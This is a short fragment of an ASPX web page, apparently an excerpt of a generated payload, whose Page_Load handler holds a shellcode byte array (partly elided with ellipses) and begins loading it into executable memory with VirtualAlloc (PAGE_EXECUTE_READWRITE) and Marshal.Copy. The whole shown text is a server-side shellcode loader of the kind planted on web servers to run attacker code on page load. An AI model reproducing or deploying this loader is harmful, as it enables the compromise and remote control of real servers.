...
<script runat="server">
    ...
    protected void Page_Load(object sender, EventArgs e)
    {
        byte[] buf = new byte[460] {
            ...
            0x0a,0x0a,0x0e,0xfe,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
            ...
            0xba,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xcd,0x64,0x9f,0x68,
        ...
        IntPtr fCLx5 = VirtualAlloc(IntPtr.Zero, (UIntPtr)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(buf, 0, fCLx5, buf.Length);
